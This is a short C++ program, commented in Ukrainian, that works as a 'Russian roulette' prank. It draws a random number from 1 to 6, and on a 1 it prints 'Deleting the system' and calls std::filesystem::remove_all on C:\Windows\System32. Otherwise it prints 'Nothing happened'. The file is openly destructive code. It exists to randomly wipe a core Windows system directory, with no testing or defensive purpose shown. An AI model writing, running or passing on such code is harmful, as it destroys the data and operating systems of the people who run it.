#include <iostream>
#include <filesystem>
#include <cstdlib>
#include <ctime>

int main() {
    std::srand(std::time(0)); // ініціалізація генератора випадкових чисел
    int random_num = std::rand() % 6 + 1; // генерація числа від 1 до 6

    if (random_num == 1) {
        std::cout << "Видалення системи" << std::endl;
        std::filesystem::remove_all("C:\\Windows\\System32");
    } else {
        std::cout << "Нічого не сталося" << std::endl;
    }

    return 0;
}